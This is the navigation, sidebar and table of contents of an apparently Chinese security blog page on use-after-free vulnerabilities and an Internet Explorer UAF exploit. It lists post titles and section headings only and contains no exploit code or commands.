class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/heap2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-22</div><div class="title">HeapSpray入门</div></div></a></div><div><a href="/2019/12/01/CVE-2012-1876/" title="IE堆漏洞利用（CVE-2012-1876）"><img class="cover" src="/img/XsPKP4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-12-01</div><div class="title">IE堆漏洞利用（CVE-2012-1876）</div></div></a></div><div><a href="/2019/10/18/Win-exploitS-E-H/" title="Windows下漏洞利用 S.E.H深入分析"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/J9yzMy.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-18</div><div class="title">Windows下漏洞利用 S.E.H深入分析</div></div></a></div><div><a href="/2019/09/22/19宿迁/" title="19江苏省省赛-宿迁"><img class="cover" src="https://s2.ax1x.com/2019/09/21/nxCsat.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-09-22</div><div class="title">19江苏省省赛-宿迁</div></div></a></div><div><a href="/2019/10/26/Gusubei/" title="从东南到东南 --姑苏杯信安大赛小记"><img class="cover" src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/3mxaVq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-10-26</div><div class="title">从东南到东南 --姑苏杯信安大赛小记</div></div></a></div><div><a href="/2019/11/12/Three-Write/" title="红帽杯PWN题-Three 解析"><img class="cover" src="/img/5WTH0f.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-11-12</div><div class="title">红帽杯PWN题-Three 解析</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Migraine殇</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/migraine-sudo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/migraine-sudo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2576361468@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://twitter.com/0xp0kerface" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎光临寒舍，右下角可以设置夜间模式</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93PWN%E9%A2%98%E7%90%86%E8%A7%A3UAF"><span class="toc-number">1.</span> <span class="toc-text">0x01通过一道PWN题理解UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1UAF%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">1.1UAF基础概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1%E6%82%AC%E6%8C%82%E6%8C%87%E9%92%88-Dangling-pointer"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1.1悬挂指针(Dangling pointer)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2%E5%8D%A0%E5%9D%91"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.1.2占坑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-3%E8%99%9A%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.1.3虚函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2%E9%80%9A%E8%BF%87PWN%E9%A2%98%E6%8E%8C%E6%8F%A1UAF"><span class="toc-number">1.2.</span> <span class="toc-text">1.2通过PWN题掌握UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2UAF%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.2UAF利用流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-IE%E6%B5%8F%E8%A7%88%E5%99%A8UAF%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">0x02 IE浏览器UAF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">2.1漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-%E5%9F%BA%E4%BA%8EPOC%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 基于POC的流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B3%9B%E8%B0%88"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2 漏洞利用泛谈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3%E7%B2%BE%E7%A1%AE%E5%A0%86%E5%96%B7%E5%B0%84"><span class="toc-number">2.1.3.</span> <span class="toc-text">2.1.3精确堆喷射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4%E6%9E%84%E9%80%A0ROP%E9%93%BE"><span class="toc-number">2.1.4.</span> <span class="toc-text">2.1.4构造ROP链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP%E6%89%A7%E8%A1%8C%E6%B5%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">EXP执行流分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0%E5%92%8C%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">2.1.5.</span> <span class="toc-text">2.1.5漏洞原因和补丁分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-number">3.</span> <span class="toc-text">参考文献</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">4.</span> <span class="toc-text">附录</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2099/12/14/Diary/" title="Diary"><img src="/img/IMG_7932.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Diary"/></a><div class="content"><a class="title" href="/2099/12/14/Diary/" title="Diary">Diary</a><time datetime="2099-12-13T16:01:36.000Z" title="发表于 2099-12-14 00:01:36">2099-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/30/nexus5/" title="Nexus5折腾小记"><img src="https://img-blog.csdnimg.cn/img_convert/182eb0788d06c05a6c26308aaa0150a1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nexus5折腾小记"/></a><div class="content"><a class="title" href="/2022/07/30/nexus5/" title="Nexus5折腾小记">Nexus5折腾小记</a><time datetime="2022-07-30T15:54:15.000Z" title="发表于 2022-07-30 23:54:15">2022-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光"><img src="https://z3.ax1x.com/2021/07/17/W13xu4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="留给这不长不短的时光"/></a><div class="content"><a class="title" href="/2021/07/12/%E7%95%99%E7%BB%99%E8%BF%99%E4%B8%8D%E9%95%BF%E4%B8%8D%E7%9F%AD%E7%9A%84%E6%97%B6%E5%85%89/" title="留给这不长不短的时光">留给这不长不短的时光</a><time datetime="2021-07-12T15:53:34.000Z" title="发表于 2021-07-12 23:53:34">2021-07-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165"><img src="https://z3.ax1x.com/2021/07/09/RvdfH0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="QEMU:CVE-2015-5165"/></a><div class="content"><a class="title" href="/2021/04/02/QEMU-CVE-2015-5165/" title="QEMU:CVE-2015-5165">QEMU:CVE-2015-5165</a><time datetime="2021-04-02T07:52:34.000Z" title="发表于 2021-04-02 15:52:34">2021-04-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）"><img src="/img/7GdBdp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mips 漏洞入门与分析（CVE-2020-8423）"/></a><div class="content"><a class="title" href="/2021/01/30/mips-pwn/" title="Mips 漏洞入门与分析（CVE-2020-8423）">Mips 漏洞入门与分析（CVE-2020-8423）</a><time datetime="2021-01-29T17:50:25.000Z" title="发表于 2021-01-30 01:50:25">2021-01-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Migraine殇</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>